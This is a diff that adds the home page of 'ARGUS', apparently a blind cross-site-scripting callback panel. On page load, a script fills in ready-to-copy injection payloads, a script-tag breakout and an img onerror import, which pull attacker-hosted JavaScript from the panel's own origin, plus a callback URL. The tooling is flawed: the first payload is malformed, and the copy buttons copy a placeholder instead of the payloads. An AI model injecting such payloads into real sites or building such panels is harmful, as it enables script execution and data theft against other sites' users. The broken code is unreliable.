@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ARGUS - Home</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.5.1/styles/default.min.css"> <!-- Highlight.js CSS -->
+    <style>
+        /* Custom styles for code snippets */
+        .code-snippet {
+            background-color: #ffffff; /* White background for code */
+            color: #000000; /* Black text color */
+            padding: 15px;
+            border-radius: 5px;
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 20px;
+            font-family: 'Courier New', Courier, monospace; /* Monospace font for code */
+            border: 1px solid #ccc; /* Light gray border */
+        }
+
+        .copy-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: #ccc; /* Gray background for button */
+            color: #282a36; /* Dark text color */
+            border: none;
+            border-radius: 5px;
+            padding: 5px 10px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .copy-button:hover {
+            background-color: #bbb; /* Darker gray on hover */
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.5.1/highlight.min.js"></script> <!-- Highlight.js JS -->
+    <script>
+        async function authenticate() {
+            const token = localStorage.getItem('authToken');
+            if (!token) {
+                // Redirect to login if not authenticated
+                window.location.href = 'login.html';
+            }
+        }
+
+        window.onload = authenticate;
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Code copied to clipboard!'); // Notify user
+            }).catch(err => {
+                console.error('Failed to copy: ', err);
+            });
+        }
+
+        // Initialize highlight.js
+        document.addEventListener('DOMContentLoaded', (event) => {
+            hljs.highlightAll(); // Highlight all code blocks
+        });
+
+        // Set the current URL origin in the code snippets
+        document.addEventListener('DOMContentLoaded', (event) => {
+            document.getElementById('firstUrlSnippet').textContent = `">script src="${window.location.origin}/aaa.js?netlify">;`;
+            document.getElementById('secondUrlSnippet').textContent = `"><img src=x onerror=import("${window.location.origin}/xxxx.js?netlify")/>)`;
+            document.getElementById('thirdUrlSnippet').textContent = `${window.location.origin}/anything?netlify // netlify keyword shuld be present if custom domain used`;
+        });
+    </script>
+</head>
+<body class="bg-gray-900 text-white">
+    <div class="flex">
+        <div class="w-64 bg-gray-800 h-screen p-5">
+            <header class="flex items-center justify-between">
+                <img src="img/logo.jpg" alt="ARGUS Logo" class="w-24">
+                <h1 class="text-xl font-bold">Home</h1>
+            </header>
+            <nav class="mt-5">
+                <a href="index.html" class="block p-2 bg-gray-700">Home</a>
+                <a href="login.html" class="block p-2 hover:bg-gray-700">Login</a>
+                <a href="dashboard.html" class="block p-2 hover:bg-gray-700">Dashboard</a>
+                <a href="view.html" class="block p-2 hover:bg-gray-700">View Details</a>
+            </nav>
+        </div>
+        <div class="flex-1 p-5">
+            <h2 class="text-2xl font-bold">Welcome to ARGUS</h2>
+            <br>
+
+            <!-- Code Snippet Section -->
+            <div class="code-snippet">
+                <button class="copy-button" onclick="copyToClipboard('const firstUrl = \"' + window.location.origin + '\";')">Copy</button>
+                <pre><code class="language-javascript" id="firstUrlSnippet">const firstUrl = "the loaded url"; // Current URL origin</code></pre>
+            </div>
+
+            <div class="code-snippet">
+                <button class="copy-button" onclick="copyToClipboard('const secondUrl = \"' + window.location.origin + '\";')">Copy</button>
+                <pre><code class="language-javascript" id="secondUrlSnippet">const secondUrl = "the loaded url"; // Current URL origin</code></pre>
+            </div>
+
+            <div class="code-snippet">
+                <button class="copy-button" onclick="copyToClipboard('const thirdUrl = \"' + window.location.origin + '\";')">Copy</button>
+                <pre><code class="language-javascript" id="thirdUrlSnippet">const thirdUrl = "the loaded url"; // Current URL origin</code></pre>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
